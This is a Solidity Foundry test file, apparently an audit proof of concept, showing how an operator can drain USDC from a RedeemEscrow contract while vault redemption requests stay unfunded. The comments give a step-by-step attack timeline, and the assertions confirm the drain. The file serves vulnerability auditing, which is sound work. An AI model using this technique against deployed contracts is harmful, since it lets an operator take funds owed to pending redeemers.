// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/RedeemEscrow.sol";
import "../src/tokens/USDM.sol";

// ATTACK TIMELINE:
// 1. [Setup] User1 deposits 10,000 USDC to get 10,000 USDM.
// 2. [T=1] User1 requests a redemption of 10,000 USDM. The Vault records this in its redeemRequests queue, but does NOT immediately add an obligation to RedeemEscrow.
// 3. [T=2] RedeemEscrow holds 10,000 USDC (e.g., from a previous batch or direct transfer), but its totalOwed is 0 because the new request hasn't been funded via addObligation().
// 4. [T=3] Malicious operator calls reclaimFromRedeemEscrow(10_000e6). RedeemEscrow.reclaimTo() checks `bal >= amount + totalOwed` (10k >= 10k + 0), which passes.
// 5. [T=4] The 10,000 USDC is transferred back to the Vault. The operator can now bridge this USDC to L1 or drain it.
// 6. [Assert] Verify RedeemEscrow balance is 0, totalOwed is 0, but the Vault still has an unfunded pending redeem request (redemptionShortfall == 10,000 USDC). Pending redeemers are now at risk of not being paid if the Vault drains the reclaimed USDC.

contract AuditAgentPoC is ToL1WeiHarness {
    function test_exploit() public {
        // 1. Setup: User1 deposits to get USDM
        _depositAs(user1, 10_000e6);

        // 2. User1 requests redemption
        vm.startPrank(user1);
        usdm.approve(address(vault), 10_000e6);
        uint256 reqId = vault.requestRedeem(10_000e6);
        vm.stopPrank();

        // 3. Simulate RedeemEscrow having 10,000 USDC balance but 0 totalOwed
        // (This represents the cross-contract gap: Escrow has funds, but doesn't know about Vault's pending queue)
        deal(address(usdc), address(redeemEscrow), 10_000e6);

        uint256 escrowBalBefore = redeemEscrow.balance();
        uint256 totalOwedBefore = redeemEscrow.totalOwed();
        uint256 shortfallBefore = vault.redemptionShortfall();

        console.log("Step 3: Escrow Balance =", escrowBalBefore);
        console.log("Step 3: Escrow totalOwed =", totalOwedBefore);
        console.log("Step 3: Vault redemptionShortfall =", shortfallBefore);

        // 4. Malicious operator reclaims the "excess" USDC from RedeemEscrow
        // reclaimTo only checks: bal >= amount + totalOwed (10k >= 10k + 0) -> PASSES
        vm.prank(operator);
        vault.reclaimFromRedeemEscrow(10_000e6);

        // 5. Verify the exploit state
        uint256 escrowBalAfter = redeemEscrow.balance();
        uint256 totalOwedAfter = redeemEscrow.totalOwed();
        uint256 shortfallAfter = vault.redemptionShortfall();

        console.log("Step 5: Escrow Balance After =", escrowBalAfter);
        console.log("Step 5: Escrow totalOwed After =", totalOwedAfter);
        console.log("Step 5: Vault redemptionShortfall After =", shortfallAfter);

        // 6. Assertions proving the cross-contract assumption mismatch
        assertEq(escrowBalAfter, 0, "RedeemEscrow was drained of all USDC");
        assertEq(totalOwedAfter, 0, "totalOwed remains 0 because obligation was never added");
        assertGt(shortfallAfter, 0, "Vault still has unfunded pending redeem requests");
        assertEq(shortfallAfter, 10_000e6, "Shortfall equals the pending redeem amount");
    }
}
